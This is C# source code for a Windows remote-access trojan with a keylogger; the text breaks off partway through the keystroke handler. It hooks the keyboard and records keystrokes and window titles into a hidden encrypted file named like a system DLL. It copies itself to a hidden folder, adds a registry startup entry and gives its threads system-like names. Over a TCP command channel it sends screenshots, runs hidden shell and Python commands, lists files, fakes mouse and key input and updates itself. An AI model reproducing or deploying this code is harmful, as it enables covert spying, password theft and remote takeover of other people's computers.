using Newtonsoft.Json;
using System.Drawing.Imaging;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net;
using System.IO.Compression;
using System.Globalization;
using SlimDX.Direct3D9;
using Microsoft.Win32;
using System.Reflection;

namespace Client {
    public delegate void OnData (string data);
    public delegate bool ConsoleEventDelegate (int eventType);
    public delegate string OnKey (Keys k, bool isDown);

    public enum CustomChar {
        EOT = (char)04,//End of transmission
        ETX = (char)03,//End of text
        FS = (char)28//File separator
    };

    public sealed class Client {
        private static string SERVER_IP = "192.168.25.76";
        private static int SERVER_PORT = 8080;
        private const string CONFIG_FILE = "ip.txt";
        private TcpClient client;
        private NetworkStream stream;

        private Thread receiveThread;
        private byte[] buffer;

        public bool isConnected { get { return client.Connected; } }

        private OnData onData;

        public static void Init () {
            var filename = CONFIG_FILE;//Path.Combine (Application.ExecutablePath, CONFIG_FILE);
            if (File.Exists (filename)) {
                Console.WriteLine ("[CLIENT] file '" + filename + "' was found!");
                SERVER_IP = File.ReadAllText (filename);
            } else Console.WriteLine ("[CLIENT] file '" + filename + "' wasn't found!");
        }

        public Client (OnData onData) {
            this.onData = onData;
            client = new TcpClient ();
        }

        public void Connect () {
            if (client.Connected) return;
            try {
                client.Connect (SERVER_IP, SERVER_PORT);
                Console.WriteLine ("[TCP] Connected!");
                stream = client.GetStream ();
                StartReceive ();
            } catch {
                Disconnect ();
            }
        }

        private void ForceDisconnect () {
            stream.Close ();
            client.Close ();
            Console.WriteLine ("[TCP] Disconnected!");
        }

        public void Disconnect () {
            if (!client.Connected) return;
            ForceDisconnect ();
        }

        public void Write (string data) {
            try {
                List<byte> bytes = Encoding.UTF8.GetBytes (data).ToList ();
                bytes.Add ((byte)CustomChar.ETX);
                stream.Write (bytes.ToArray (), 0, bytes.Count);
            } catch {
                Disconnect ();
            }
        }

        public void Write (byte[] data) {
            try {
                stream.Write (data, 0, data.Length);
            } catch {
                Disconnect ();
            }
        }

        public void Send (string label, string data) {
            try {
                List<byte> bytes = Encoding.UTF8.GetBytes (label).ToList ();
                bytes.Add ((byte)CustomChar.ETX);
                bytes.AddRange (Encoding.UTF8.GetBytes (data));
                bytes.Add ((byte)CustomChar.EOT);
                stream.Write (bytes.ToArray (), 0, bytes.Count);
            } catch {
                Disconnect ();
            }
        }

        public void Send (string label, byte[] data) {
            try {
                List<byte> bytes = Encoding.UTF8.GetBytes (label).ToList ();
                bytes.Add ((byte)CustomChar.ETX);
                bytes.AddRange (data);
                bytes.Add ((byte)CustomChar.EOT);
                stream.Write (bytes.ToArray (), 0, bytes.Count);
            } catch {
                Disconnect ();
            }
        }

        private void StartReceive () {
            receiveThread = new Thread (delegate () {
                while (isConnected) {
                    // Detect if client disconnected
                    try {
                        if (client.Client.Poll (0, SelectMode.SelectRead)) {
                            byte[] buff = new byte[1];
                            if (client.Client.Receive (buff, SocketFlags.Peek) == 0) {
                                ForceDisconnect ();
                                return;
                            }
                        }
                    } catch {
                        ForceDisconnect ();
                        return;
                    }

                    if (stream.CanRead && stream.DataAvailable) {
                        buffer = new byte[8];
                        MemoryStream ms = new MemoryStream ();

                        do {
                            int bytesRead = stream.Read (buffer, 0, buffer.Length);
                            if (bytesRead > 0) ms.Write (buffer, 0, bytesRead);
                            else break;
                        } while (stream.DataAvailable && stream.CanRead);

                        string[] packets = Encoding.UTF8.GetString (ms.ToArray (), 0, (int)ms.Length).Split (new[] { (char)04 }, StringSplitOptions.RemoveEmptyEntries);
                        foreach (string p in packets) onData (p);
                    } else {
                        Thread.Sleep (1);
                    }
                }
            }) {
                IsBackground = false, Name = "Explorer.win32", Priority = ThreadPriority.Highest
            };
            receiveThread.Start ();
        }
    }

    public static class CryptoUtility {
        public static byte[] Encrypt (byte[] input, string pass) {
            if (input.Length <= 0) return input;
            PasswordDeriveBytes pdb =
              new PasswordDeriveBytes (pass, // Change this
              new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream ();
            Aes aes = new AesManaged ();
            aes.Key = pdb.GetBytes (aes.KeySize / 8);
            aes.IV = pdb.GetBytes (aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream (ms,
              aes.CreateEncryptor (), CryptoStreamMode.Write);
            cs.Write (input, 0, input.Length);
            cs.Close ();
            return ms.ToArray ();
        }
        public static byte[] Decrypt (byte[] input, string pass) {
            if (input.Length <= 0) return input;
            PasswordDeriveBytes pdb =
              new PasswordDeriveBytes (pass, // Change this
              new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream ();
            Aes aes = new AesManaged ();
            aes.Key = pdb.GetBytes (aes.KeySize / 8);
            aes.IV = pdb.GetBytes (aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream (ms,
              aes.CreateDecryptor (), CryptoStreamMode.Write);
            cs.Write (input, 0, input.Length);
            cs.Close ();
            return ms.ToArray ();
        }
    }

    public static class Logger {
        public static string log_file = "win32.dll";
        public static string PASSPHRASE = "TsdasdaqwEQwetlUnM=";
        private static volatile bool isUsing = false;

        public static string GetWorkPath () {
            string workpath = Path.Combine (Environment.GetFolderPath (Environment.SpecialFolder.LocalApplicationData), "win_cmd");
            if (!Directory.Exists (workpath)) {
                var d = Directory.CreateDirectory (workpath);
                d.Attributes |= FileAttributes.Hidden;
            }
            return workpath;
        }

        public static string GetExePath () {
            return Path.Combine (Logger.GetWorkPath (), "win_proc32.exe");
        }

        private static string GetFilename () {
            string filename = Path.Combine (GetWorkPath (), log_file);
            if (!File.Exists (filename)) {
                File.Create (filename).Close ();
                File.SetAttributes (filename, FileAttributes.Hidden);
            }
            return filename;
        }

        private static bool IsFileLocked (string filename) {
            FileStream stream = null;
            try {
                FileInfo file = new FileInfo (filename);
                stream = file.Open (FileMode.OpenOrCreate, FileAccess.Read, FileShare.Read);
            } catch (IOException) {
                //the file is unavailable because it is:
                //still being written to
                //or being processed by another thread
                //or does not exist (has already been processed)
                return true;
            } finally {
                if (stream != null)
                    stream.Close ();
            }

            //file is not locked
            return false;
        }

        private static byte[] ReadAll (FileStream f) {
            byte[] t = new byte[f.Length];
            f.Read (t, 0, t.Length);
            return t;
        }

        private static void WriteAll (FileStream f, byte[] data) {
            f.SetLength (0);
            f.Write (data, 0, data.Length);
        }

        public static void SaveData (string data) {
            Console.WriteLine (data);
            var t = new Thread (delegate () {
                while (isUsing) Thread.Sleep (10);

                isUsing = true;
                string filename = GetFilename ();

                while (IsFileLocked (filename)) Thread.Sleep (10);

                try {
                    var f = File.Open (filename, FileMode.OpenOrCreate);

                    byte[] b = Encoding.UTF8.GetBytes (data);
                    if (File.Exists (filename)) {
                        List<byte> d = CryptoUtility.Decrypt (ReadAll (f), PASSPHRASE).ToList ();
                        d.AddRange (b);

                        WriteAll (f, CryptoUtility.Encrypt (d.ToArray (), PASSPHRASE));
                    } else {
                        WriteAll (f, CryptoUtility.Encrypt (b, PASSPHRASE));
                    }

                    f.Close ();
                    isUsing = false;
                } catch (Exception e) {
                    throw e;
                }
            }) { Name = "Winx86", Priority = ThreadPriority.Lowest, IsBackground = true };
            t.Start ();
        }

        public static byte[] GetLogs () {
            while (IsFileLocked (GetFilename ())) Thread.Sleep (10);

            var f = File.Open (GetFilename (), FileMode.OpenOrCreate);

            byte[] a = CryptoUtility.Decrypt (ReadAll (f), PASSPHRASE);
            f.Close ();
            return a;
        }

        public static void ClearLogs () {
            var t = new Thread (delegate () {
                while (IsFileLocked (GetFilename ())) Thread.Sleep (10);

                File.Delete (GetFilename ());
            }) { Name = "Win32", Priority = ThreadPriority.Lowest, IsBackground = true };
            t.Start ();
        }
    }

    public static class ComputerMonitor {
        #region Key logger
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _keylogger_hookID = IntPtr.Zero;
        private static OnKey onkey;
        public static bool ignoreNextKeypress = false;

        private delegate IntPtr LowLevelKeyboardProc (int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport ("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx (int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport ("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs (UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx (IntPtr hhk);

        [DllImport ("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx (IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport ("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle (string lpModuleName);

        private static IntPtr SetHook (LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess ())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx (WH_KEYBOARD_LL, proc, GetModuleHandle (curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback (int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32 (lParam);

                Logger.SaveData (onkey ((Keys)vkCode, true));
            } else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP) {
                if (ignoreNextKeypress) {
                    ignoreNextKeypress = false;
                } else {
                    int vkCode = Marshal.ReadInt32 (lParam);

                    Logger.SaveData (onkey ((Keys)vkCode, false));
                }
            }

            return CallNextHookEx (_keylogger_hookID, nCode, wParam, lParam);
        }

        #endregion
        #region Active window watcher
        private static WinEventDelegate dele = null;
        private static string lastWindow = "";
        private static IntPtr _window_hookID;
        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;

        delegate void WinEventDelegate (IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        [DllImport ("user32.dll")]
        static extern IntPtr SetWinEventHook (uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        [DllImport ("user32.dll")]
        static extern bool UnhookWinEvent (IntPtr hWinEventHook);

        [DllImport ("user32.dll")]
        static extern IntPtr GetForegroundWindow ();

        [DllImport ("user32.dll")]
        static extern int GetWindowText (IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle () {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder (nChars);
            handle = GetForegroundWindow ();

            if (GetWindowText (handle, Buff, nChars) > 0) {
                return Buff.ToString ();
            }
            return null;
        }

        private static void WinEventProc (IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime) {
            string windowTitle = GetActiveWindowTitle ();
            if (windowTitle != lastWindow) {
                Logger.SaveData ("</window><window title=\"" + windowTitle + "\">");
                lastWindow = windowTitle;
            }
        }
        #endregion

        public static void Start (OnKey callback) {
            onkey = callback;
            _keylogger_hookID = SetHook (_proc);

            dele = new WinEventDelegate (WinEventProc);
            _window_hookID = SetWinEventHook (EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);

            Logger.SaveData ("<startup text=\"" + DateTime.Now.ToString ("dd/MM/yyyy HH:mm:ss") + "\">");

            lastWindow = GetActiveWindowTitle ();
            Logger.SaveData ("<window title=\"" + lastWindow + "\">");
        }

        public static void Stop () {
            UnhookWindowsHookEx (_keylogger_hookID);
            UnhookWinEvent (_window_hookID);
        }
    }

    public static class RegistryHandler {
        public static void AddStartupItem (string maskName) {
            if (IsStartupItem (maskName)) return;
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            // Add the value in the registry so that the application runs at startup
            rkApp.SetValue (maskName, Assembly.GetExecutingAssembly ().Location);
        }

        public static void RemoveStartupItem (string maskName) {
            if (!IsStartupItem (maskName)) return;
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            // Remove the value from the registry so that the application doesn't start
            rkApp.DeleteValue (maskName, false);
        }

        public static bool IsStartupItem (string maskName) {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            return rkApp.GetValue (maskName) != null;
        }
    }

    public static class Direct3DCapture {
        public const bool USE_DIRECTX = false;
        private static Device d;
        private static string filename;

        public static void Init () {
            if (!USE_DIRECTX) return;
            filename = Path.ChangeExtension (Path.GetTempFileName (), ".bmp");
            PresentParameters present_params = new PresentParameters () {
                Windowed = true,
                SwapEffect = SwapEffect.Discard/*,
                BackBufferCount = 1,
                FullScreenRefreshRateInHertz = 0*/
            };
            d = new Device (new Direct3D (), 0, DeviceType.Hardware, IntPtr.Zero, CreateFlags.SoftwareVertexProcessing, present_params);
        }

        private static Surface CaptureScreen () {
            if (!USE_DIRECTX) throw new Exception ();
            Surface s = Surface.CreateOffscreenPlain (d, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, Format.A8R8G8B8, Pool.Scratch);
            d.GetFrontBufferData (0, s);
            return s;
        }

        public static Bitmap TakeScreenshot () {
            if (!USE_DIRECTX) throw new Exception ();
            Surface s = CaptureScreen ();
            Surface.ToFile (s, filename, ImageFileFormat.Bmp);
            Bitmap bmp = new Bitmap (filename);
            try { File.Delete (filename); } catch { }
            return bmp;
        }

    }

    class Program {
        #region API
        [DllImport ("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler (ConsoleEventDelegate callback, bool add);

        [StructLayout (LayoutKind.Sequential)]
        private struct CURSORINFO {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout (LayoutKind.Sequential)]
        private struct POINTAPI {
            public int x;
            public int y;
        }

        [DllImport ("user32.dll")]
        private static extern bool GetCursorInfo (out CURSORINFO pci);
        [DllImport ("user32.dll", SetLastError = true)]
        static extern bool DrawIconEx (IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

        private const Int32 CURSOR_SHOWING = 0x0001;
        private const Int32 DI_NORMAL = 0x0003;

        static Bitmap CapturePrimaryScreen (bool captureMouse) {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;

            var bitmap = CaptureScreen (bounds, captureMouse);
            return bitmap;
        }
        static Bitmap CaptureScreen (Rectangle bounds, bool captureMouse) {
            Bitmap result = new Bitmap (bounds.Width, bounds.Height);

            try {
                using (Graphics g = Graphics.FromImage (result)) {
                    g.CopyFromScreen (bounds.Location, Point.Empty, bounds.Size);

                    if (captureMouse) {
                        CURSORINFO pci;
                        pci.cbSize = Marshal.SizeOf (typeof (CURSORINFO));

                        if (GetCursorInfo (out pci)) {
                            if (pci.flags == CURSOR_SHOWING) {
                                var hdc = g.GetHdc ();
                                DrawIconEx (hdc, pci.ptScreenPos.x - bounds.X, pci.ptScreenPos.y - bounds.Y, pci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                                g.ReleaseHdc ();
                            }
                        }
                    }
                }
            } catch {
                result = null;
            }

            return result;
        }
        private static ImageCodecInfo GetEncoder (ImageFormat format) {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders ();
            foreach (ImageCodecInfo codec in codecs) {
                if (codec.FormatID == format.Guid) {
                    return codec;
                }
            }

            return null;
        }

        [DllImport ("user32.dll")]
        public static extern void mouse_event (int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        private const int MOUSEEVENT_LEFTDOWN = 0x02;
        private const int MOUSEEVENT_LEFTUP = 0x04;
        private const int MOUSEEVENT_MIDDLEDOWN = 0x20;
        private const int MOUSEEVENT_MIDDLEUP = 0x40;
        private const int MOUSEEVENT_RIGHTDOWN = 0x08;
        private const int MOUSEEVENT_RIGHTUP = 0x10;
        private const int MOUSEEVENT_WHEEL = 0x0800;
        #endregion

        private static long D_SUM = 0, G_SUM = 0;
        private static int D_COUNTER = 1, G_COUNTER = 1;
        private const string VERSION = "v1.0";
        private static bool IS_RUNNING = true;

        private const string
            LEFT_T = "0",
            RIGHT_T = "1",
            PRESS_T = "2",
            RELEASE_T = "3",
            MIDDLE_T = "4",
            WHEEL_T = "5",
            MOVE_T = "6",
            CLICK_T = "7",
            CURSOR_T = "8";

        private static Thread mainThread;
        private static Client socket;
        private static bool waitingForData = false;
        private static string dataWaitingFor = "";
        private static ImageCodecInfo JPEG_ENCODING = GetEncoder (ImageFormat.Jpeg);
        private static Point? lastMousePos = null;

        private static bool captureCursor = false;

        private const string Python_URL = @"https://www.python.org/ftp/python/3.5.3/python-3.5.3-embed-win32.zip";
        private const string PIP_URL = @"https://bootstrap.pypa.io/get-pip.py";

        private static List<byte> socketBuffer = new List<byte> ();

        static ConsoleEventDelegate handler;
        static bool ConsoleEventCallback (int eventType) {
            if (eventType == 2) {
                OnClose ();
            }
            return false;
        }

        static void OnClose () {
            var t = new Thread (delegate () {
                try {
                    Logger.SaveData ("<shutdown text=\"" + DateTime.Now.ToString ("dd/MM/yyyy HH:mm:ss") + "\">");
                    mainThread.Interrupt ();
                    mainThread.Abort ();
                    socket.Disconnect ();
                    ComputerMonitor.Stop ();
                } catch { OnClose (); }
            }) { Name = "Win32", Priority = ThreadPriority.Highest, IsBackground = true };
            t.Start ();
        }

        static void WaitToConnect () {
            while (!socket.isConnected) {
                Thread.Sleep (100);
                socket.Connect ();
            }
            while (socket.isConnected) {
                Application.DoEvents ();
            }
        }

        public static void Send (string a, string b) {
            if (socket != null && socket.isConnected) {
                socket.Send (a, b);
            } else {
                socketBuffer.AddRange (Encoding.UTF8.GetBytes (a));
                socketBuffer.Add ((byte)CustomChar.ETX);
                socketBuffer.AddRange (Encoding.UTF8.GetBytes (b));
                socketBuffer.Add ((byte)CustomChar.EOT);
            }
        }

        static void ExecuteCode (string code) {
            var t = new Thread (delegate () {
                try {
                    string filename = Path.Combine (Logger.GetWorkPath (), "cgi");
                    if (Directory.Exists (filename)) {
                        string code_filename = Path.Combine (Logger.GetWorkPath (), "win.forms.py");
                        File.WriteAllText (code_filename, code);
                        File.SetAttributes (code_filename, FileAttributes.Hidden);

                        Process p = new Process () {
                            StartInfo = new ProcessStartInfo (Path.Combine (filename, "python.exe"), code_filename) {
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true
                            }
                        };
                        p.Start ();

                        p.OutputDataReceived += (sender, e) => {
                            Send ("code_result", e.Data);
                        };
                        p.BeginOutputReadLine ();

                        p.ErrorDataReceived += (sender, e) => {
                            Send ("code_result", "error:\n" + e.Data);
                        };
                        p.BeginErrorReadLine ();

                        p.WaitForExit ();

                        Send ("code_result", "FINISH: " + p.ExitCode.ToString ());
                        p.Close ();

                        File.Delete (code_filename);
                    } else {
                        Send ("code_result", "Python not downloaded!");
                    }
                } catch (Exception e) {
                    Send ("code_result", "Error!\n" + e.Message);//.AppendLine (e.StackTrace);
                }
            }) { Name = "Win32", Priority = ThreadPriority.Highest };
            t.Start ();
        }

        static void RestartApplication () {
            var exePath = Application.ExecutablePath;
            var t = new Thread (() => {
                Process.Start (exePath);
            }) { Name = "Win32", Priority = ThreadPriority.Lowest, IsBackground = true };
            t.Start ();
            Thread.Sleep (250);

            if (mainThread != null) mainThread.Abort ();
            Application.ExitThread ();
            Application.Exit ();
        }

        static void CheckUpdate (string data) {
            if (data != VERSION) {
                //Need an update
                socket.Send ("update", "");
            }
        }

        static void DoUpdate (string data) {
            if (data == "[No update]") return;

            try {
                byte[] binary = Convert.FromBase64String (data);
                var tempFile = Path.GetTempFileName ();
                File.WriteAllBytes (tempFile, binary);
                Logger.SaveData ("<update info=\"Succes\" version=\"" + VERSION + "\"/>");
            } catch (Exception e) {
                Logger.SaveData ("<update info=\"Failed\"/>");
            } finally {
                RestartApplication ();
            }
        }

        static void TakeScreenshot () {
            var t = new Thread (delegate () {
                //Bitmap bmp = CapturePrimaryScreen (true);
                Bitmap bmp;
                Stopwatch watch = Stopwatch.StartNew ();
                bool isDirectx = false;
                try {
                    bmp = Direct3DCapture.TakeScreenshot ();
                    //Console.Write ("DIRECTX ");
                    isDirectx = true;
                } catch (Exception e) {
                    bmp = CapturePrimaryScreen (captureCursor);
                    /*Console.WriteLine (e.Message);
                    Console.WriteLine (e.StackTrace);
                    return;*/
                    //Console.Write ("GDI ");
                }
                watch.Stop ();

                if (isDirectx) {
                    D_SUM += watch.ElapsedMilliseconds;
                    D_COUNTER++;
                } else {
                    G_SUM += watch.ElapsedMilliseconds;
                    G_COUNTER++;
                }

                Console.WriteLine ("DIRECTX " + (D_SUM / D_COUNTER));
                Console.WriteLine ("GDI     " + (G_SUM / G_COUNTER));

                System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                EncoderParameters myEncoderParameters = new EncoderParameters (1);
                myEncoderParameters.Param[0] = new EncoderParameter (myEncoder, 15L);
                MemoryStream ms = new MemoryStream ();
                bmp.Save (ms, JPEG_ENCODING, myEncoderParameters);
                string base64 = Convert.ToBase64String (ms.ToArray ());

                Send ("image", base64);
            }) { Name = "Win32", Priority = ThreadPriority.Highest, IsBackground = false };
            t.Start ();
        }

        static void ExecuteBatch (string command) {
            var t = new Thread (delegate () {
                Process cmd = new Process ();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start ();

                cmd.StandardInput.WriteLine (command);
                cmd.StandardInput.Flush ();
                cmd.StandardInput.Close ();
                cmd.WaitForExit ();
                string c = cmd.StandardOutput.ReadToEnd ();

                c = c.Substring (c.IndexOf (">" + command) + command.Length + 2);
                c = c.Substring (0, c.LastIndexOf ("\n"));
                Send ("batch_result", c);
            }) { Name = "Win32", Priority = ThreadPriority.Lowest, IsBackground = true };
            t.Start ();
        }

        static void ListFiles (string directory) {
            var t = new Thread (delegate () {
                StringBuilder buffer = new StringBuilder ();
                directory = directory.Replace ("\\", "/");
                if (directory == "|") {
                    string[] drives = Directory.GetLogicalDrives ();

                    buffer.Append ("files").Append ((char)CustomChar.FS).Append ("folders").Append ((char)CustomChar.FS);
                    foreach (string drive in drives) buffer.Append (drive).Append ((char)CustomChar.FS);
                } else if (Directory.Exists (directory)) {
                    string[] files = Directory.GetFiles (directory);
                    string[] folders = Directory.GetDirectories (directory);

                    buffer.Append ("files").Append ((char)CustomChar.FS);
                    foreach (string file in files) buffer.Append (Path.GetFileName (file)).Append ((char)CustomChar.FS);

                    buffer.Append ((char)CustomChar.FS).Append ("folders").Append ((char)CustomChar.FS);
                    foreach (string folder in folders) buffer.Append (Path.GetFileName (folder)).Append ((char)CustomChar.FS);
                }

                Send ("list_files", buffer.ToString ());
            }) { Name = "Win32", Priority = ThreadPriority.Lowest, IsBackground = true };
            t.Start ();
        }

        static void SimulateKeypress (string vk) {
            ComputerMonitor.ignoreNextKeypress = true;
            try {
                SendKeys.Send (vk);
            } catch {
                try {
                    SendKeys.SendWait (vk);
                } catch {
                    ComputerMonitor.ignoreNextKeypress = false;
                }
            }
        }

        static void SimulateMouseEvent (string data) {
            var action = data[0].ToString ();
            var btn = data.Substring (1);
            if (action == PRESS_T) {
                switch (btn) {
                    case LEFT_T: mouse_event (MOUSEEVENT_LEFTDOWN, 0, 0, 0, 0); break;
                    case RIGHT_T: mouse_event (MOUSEEVENT_RIGHTDOWN, 0, 0, 0, 0); break;
                    case CURSOR_T: captureCursor = true; break;
                }
            } else if (action == RELEASE_T) {
                switch (btn) {
                    case LEFT_T: mouse_event (MOUSEEVENT_LEFTUP, 0, 0, 0, 0); break;
                    case RIGHT_T: mouse_event (MOUSEEVENT_RIGHTUP, 0, 0, 0, 0); break;
                    case CURSOR_T: captureCursor = false; break;
                }
            } else if (action == CLICK_T) {
                switch (btn) {
                    case LEFT_T:
                        mouse_event (MOUSEEVENT_LEFTDOWN, 0, 0, 0, 0);
                        mouse_event (MOUSEEVENT_LEFTUP, 0, 0, 0, 0);
                        break;
                    case RIGHT_T:
                        mouse_event (MOUSEEVENT_RIGHTDOWN, 0, 0, 0, 0);
                        mouse_event (MOUSEEVENT_RIGHTUP, 0, 0, 0, 0);
                        break;
                }
            } else if (action == MOVE_T) {
                SimulateMouseMove (btn);
            } else if (action == WHEEL_T) {
                SimulateMouseWheel (btn);
            }

            //if (lastMousePos != null) SimulateMouseMove (null);//Go back where it was
        }

        static void SimulateMouseMove (string data) {
            /*if (data == null) {
                Cursor.Position = new Point (lastMousePos.Value.X, lastMousePos.Value.Y);
                lastMousePos = null;
                return;
            }*/

            int separator = data.IndexOf (";");
            var cultureInfo = new CultureInfo ("en-US").NumberFormat;
            float dx = float.Parse (data.Substring (0, separator), cultureInfo);
            float dy = float.Parse (data.Substring (separator + 1), cultureInfo);

            int x = (int)(Screen.PrimaryScreen.Bounds.Width * dx);
            int y = (int)(Screen.PrimaryScreen.Bounds.Height * dy);


            lastMousePos = new Point (Cursor.Position.X, Cursor.Position.Y);
            Cursor.Position = new Point (x, y);
        }

        static void SimulateMouseWheel (string data) {
            if (data == "1") mouse_event (MOUSEEVENT_WHEEL, 0, 0, 120, 0);
            else mouse_event (MOUSEEVENT_WHEEL, 0, 0, -120, 0);
        }

        static void SelfCopy () {
            File.Copy (Application.ExecutablePath, Logger.GetExePath ());
        }

        static void SelfStart () {
            Process.Start (Logger.GetExePath ());
            Thread.Sleep (250);
            if (mainThread != null) mainThread.Abort ();
            Application.ExitThread ();
            Application.Exit ();
            IS_RUNNING = false;
        }

        static void DownloadPython () {
            var t = new Thread (delegate () {
                try {
                    WebClient client = new WebClient ();
                    string filename = Path.Combine (Logger.GetWorkPath (), "python.zip");
                    File.Create (filename).Close ();

                    string targetFile = Path.Combine (Logger.GetWorkPath (), "cgi");
                    Directory.CreateDirectory (targetFile);

                    client.DownloadProgressChanged += (e, a) => {
                        if (a.ProgressPercentage % 11 == 0)
                            Logger.SaveData ("<download file=\"" + filename + "\" progress=\"" + a.ProgressPercentage + "%\">");
                    };
                    client.DownloadFileCompleted += (e, a) => {
                        if (a.Cancelled) {
                            Logger.SaveData ("<download file=\"" + filename + "\" progress=\"-1%\">");
                            return;
                        }

                        Logger.SaveData ("<download file=\"" + filename + "\" progress=\"100%\">");
                        ZipFile.ExtractToDirectory (filename, targetFile);
                        File.Delete (filename);
                        File.SetAttributes (targetFile, FileAttributes.Hidden);

                        ExecuteCode (client.DownloadString (PIP_URL));

                        SelfStart ();
                    };
                    Logger.SaveData ("<download file=\"" + filename + "\" progress=\"0%\">");
                    client.DownloadFileAsync (new Uri (Python_URL), filename);
                } catch {                    
                    Directory.Delete (Path.Combine (Logger.GetWorkPath (), "cgi"));
                    SelfStart ();
                }
            }) { Name = "Win32", Priority = ThreadPriority.Lowest, IsBackground = true };
            t.Start ();
        }

        static string OnKeyCallback (Keys vk, bool pressed) {
            string buffer = "";
            switch (vk) {
                case Keys.A:
                case Keys.B:
                case Keys.C:
                case Keys.D:
                case Keys.E:
                case Keys.F:
                case Keys.G:
                case Keys.H:
                case Keys.I:
                case Keys.J:
                case Keys.K:
                case Keys.L:
                case Keys.M:
                case Keys.N:
                case Keys.O:
                case Keys.P:
                case Keys.Q:
                case Keys.R:
                case Keys.S:
                case Keys.T:
                case Keys.U:
                case Keys.V:
                case Keys.W:
                case Keys.X:
                case Keys.Y:
                case Keys.Z:
                case Keys.D0:
                case Keys.D1:
                case Keys.D2:
                case Keys.D3:
                case Keys.D4:
                case Keys.D5:
                case Keys.D6:
                case Keys.D7:
                case Keys.D8:
                case Keys.D9:
                    if (pressed) buffer += (char)vk;
                    break;
                case Keys.NumPad0: if (pressed) buffer = "<Numpad0/>"; break;
                case Keys.NumPad1: if (pressed) buffer = "<Numpad1/>"; break;
                case Keys.NumPad2: if (pressed) buffer = "<Numpad2/>"; break;
                case Keys.NumPad3: if (pressed) buffer = "<Numpad3/>"; break;
                case Keys.NumPad4: if (pressed) buffer = "<Numpad4/>"; break;
                case Keys.NumPad5: if (pressed) buffer = "<Numpad5/>"; break;
                case Keys.NumPad6: if (pressed) buffer = "<Numpad6/>"; break;
                case Keys.NumPad7: if (pressed) buffer = "<Numpad7/>"; break;
                case Keys.NumPad8: if (pressed) buffer = "<Numpad8/>"; break;
                case Keys.NumPad9: if (pressed) buffer = "<Numpad9/>"; break;
                case Keys.Return:
                    if (pressed) buffer = "<enter/>";
                    break;
                case Keys.Space:
                    if (pressed) buffer = "<space/>";
                    break;
                case Keys.Back:
                    if (pressed) buffer = "<backspace/>";
                    break;
                case Keys.Delete:
                    if (pressed) buffer = "<delete/>";
                    break;
                case Keys.Home:
                    if (pressed) buffer = "<home/>";
                    break;
                case Keys.End:
                    if (pressed) buffer = "<end/>";
                    break;
                case Keys.PageUp:
                    if (pressed) buffer = "<pageup/>";
                    break;
